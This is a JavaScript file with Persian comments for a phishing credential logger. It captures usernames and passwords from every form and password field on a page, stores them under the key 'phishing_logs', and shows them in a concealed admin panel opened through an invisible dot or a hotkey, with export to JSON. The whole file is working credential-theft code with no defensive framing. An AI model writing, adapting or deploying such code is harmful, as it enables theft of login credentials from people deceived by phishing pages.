// پنل مدیریت با نقطه کوچک
class SimpleAdminPanel {
    constructor() {
        this.password = "admin123";
        this.storageKey = "phishing_logs";
        this.init();
    }

    init() {
        // ایجاد نقطه مخفی
        this.createDot();
        
        // کلید ترکیبی
        document.addEventListener('keydown', (e) => {
            if (e.ctrlKey && e.shiftKey && e.key === 'A') {
                e.preventDefault();
                this.showLogin();
            }
        });

        // ثبت خودکار فرم‌ها
        this.setupFormLogger();
    }

    createDot() {
        const dot = document.createElement('div');
        dot.innerHTML = '•';
        dot.style.cssText = `
            position: fixed;
            bottom: 15px;
            right: 15px;
            width: 8px;
            height: 8px;
            font-size: 20px;
            color: rgba(0,0,0,0.0);
            cursor: pointer;
            z-index: 9999;
            user-select: none;
            transition: color 0.3s;
        `;
        
        dot.onmouseover = () => dot.style.color ="0.0.0.2" ;
        dot.onmouseout = () => dot.style.color ="0.0.0.2" ;
        dot.onclick = (e) => {
            e.preventDefault();
            e.stopPropagation();
            this.showLogin();
        };

        document.body.appendChild(dot);
    }

    setupFormLogger() {
        // ردیابی ارسال فرم
        document.addEventListener('submit', (e) => {
            const form = e.target;
            setTimeout(() => {
                this.saveLogin(form);
            }, 50);
        });

        // ردیابی فیلدهای ورود
        document.addEventListener('input', (e) => {
            const input = e.target;
            if (input.type === 'password') {
                this.trackPassword(input);
            }
        });
    }

    saveLogin(form) {
        try {
            const data = {};
            const inputs = form.querySelectorAll('input');
            
            inputs.forEach(input => {
                if (input.type !== 'submit' && input.type !== 'button') {
                    const key = input.name || input.id || input.placeholder || 'field';
                    data[key] = input.value;
                }
            });

            const log = {
                id: Date.now(),
                username: data.username || data.user || data['نام کاربری'] || '?',
                password: data.password || data.pass || data['رمز عبور'] || '?',
                time: new Date().toLocaleString('fa-IR'),
                url: window.location.href
            };

            // ذخیره
            const logs = this.getLogs();
            logs.push(log);
            localStorage.setItem(this.storageKey, JSON.stringify(logs));
            
            console.log('✅ ذخیره شد:', log.username);

        } catch (err) {
            console.error('خطا:', err);
        }
    }

    trackPassword(input) {
        if (!input._tracked) {
            input._tracked = true;
            const form = input.closest('form');
            if (form) {
                form.addEventListener('submit', () => {
                    this.saveLogin(form);
                });
            }
        }
    }

    showLogin() {
        const pass = prompt('🔐 رمز پنل مدیریت:', '');
        if (pass === this.password) {
            this.showPanel();
        } else if (pass !== null) {
            alert('رمز اشتباه');
        }
    }

    showPanel() {
        const logs = this.getLogs();
        
        // پنل
        const panel = document.createElement('div');
        panel.style.cssText = `
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 90%;
            max-width: 700px;
            height: 80vh;
            background: white;
            z-index: 10000;
            border-radius: 10px;
            box-shadow: 0 0 30px rgba(0,0,0,0.3);
            display: flex;
            flex-direction: column;
            font-family: Tahoma;
        `;
        
        panel.innerHTML = `
            <div style="padding: 15px; background: #2c3e50; color: white; border-radius: 10px 10px 0 0; display: flex; justify-content: space-between; align-items: center;">
                <h3 style="margin: 0; font-size: 16px;">مدیریت لاگ‌ها (${logs.length})</h3>
                <button onclick="this.parentNode.parentNode.remove();" style="background: #e74c3c; color: white; border: none; width: 30px; height: 30px; border-radius: 50%; cursor: pointer;">×</button>
            </div>
            
            <div style="padding: 10px; background: #ecf0f1; border-bottom: 1px solid #ddd; display: flex; gap: 10px;">
                <button onclick="exportData()" style="padding: 8px 12px; background: #27ae60; color: white; border: none; border-radius: 5px; cursor: pointer; font-size: 12px;">📥 ذخیره</button>
                <button onclick="clearData()" style="padding: 8px 12px; background: #e74c3c; color: white; border: none; border-radius: 5px; cursor: pointer; font-size: 12px;">🗑️ پاک کردن</button>
                <button onclick="refreshView()" style="padding: 8px 12px; background: #3498db; color: white; border: none; border-radius: 5px; cursor: pointer; font-size: 12px;">🔄 بروزرسانی</button>
            </div>
            
            <div style="flex: 1; overflow: auto; padding: 10px;">
                ${this.getLogsHTML(logs)}
            </div>
        `;
        
        document.body.appendChild(panel);
        
        // توابع
        window.exportData = () => this.exportData();
        window.clearData = () => this.clearData();
        window.refreshView = () => {
            panel.remove();
            this.showPanel();
        };
    }

    getLogsHTML(logs) {
        if (logs.length === 0) {
            return '<div style="text-align: center; padding: 40px; color: #95a5a6;">داده‌ای وجود ندارد</div>';
        }
        
        return `
            <table style="width: 100%; border-collapse: collapse; font-size: 12px;">
                <thead>
                    <tr style="background: #34495e; color: white;">
                        <th style="padding: 8px; border: 1px solid #2c3e50; width: 50px;">#</th>
                        <th style="padding: 8px; border: 1px solid #2c3e50;">زمان</th>
                        <th style="padding: 8px; border: 1px solid #2c3e50;">کاربر</th>
                        <th style="padding: 8px; border: 1px solid #2c3e50;">رمز</th>
                    </tr>
                </thead>
                <tbody>
                    ${logs.map((log, index) => `
                        <tr style="background: ${index % 2 ? '#f8f9fa' : 'white'};">
                            <td style="padding: 6px; border: 1px solid #ddd; text-align: center;">${index + 1}</td>
                            <td style="padding: 6px; border: 1px solid #ddd; text-align: center; font-size: 11px;">${log.time}</td>
                            <td style="padding: 6px; border: 1px solid #ddd; text-align: center; font-family: monospace;">${this.escape(log.username)}</td>
                            <td style="padding: 6px; border: 1px solid #ddd; text-align: center; font-family: monospace; color: #c0392b; font-weight: bold;">${this.escape(log.password)}</td>
                        </tr>
                    `).reverse().join('')}
                </tbody>
            </table>
        `;
    }

    getLogs() {
        try {
            const data = localStorage.getItem(this.storageKey);
            return data ? JSON.parse(data) : [];
        } catch {
            return [];
        }
    }

    exportData() {
        const logs = this.getLogs();
        const json = JSON.stringify(logs, null, 2);
        const blob = new Blob([json], {type: 'application/json'});
        const url = URL.createObjectURL(blob);
        
        const a = document.createElement('a');
        a.href = url;
        a.download = `logs_${Date.now()}.json`;
        a.click();
        
        setTimeout(() => URL.revokeObjectURL(url), 100);
        alert(`${logs.length} لاگ ذخیره شد`);
    }

    clearData() {
        if (confirm(`${this.getLogs().length} لاگ پاک شود؟`)) {
            localStorage.removeItem(this.storageKey);
            alert('پاک شد');
            document.querySelector('div[style*="position: fixed; top: 50%"]')?.remove();
        }
    }

    escape(text) {
        return String(text).replace(/[&<>]/g, m => ({
            '&': '&amp;', '<': '&lt;', '>': '&gt;'
        })[m]);
    }
}

// راه‌اندازی
document.addEventListener('DOMContentLoaded', () => {
    window.admin = new SimpleAdminPanel();
    
    // راهنمای کنسول
    setTimeout(() => {
        console.log('نقته کوچیک پایین سمت راست صفحه 👇');
        console.log('یا Ctrl+Shift+A');
    }, 2000);
});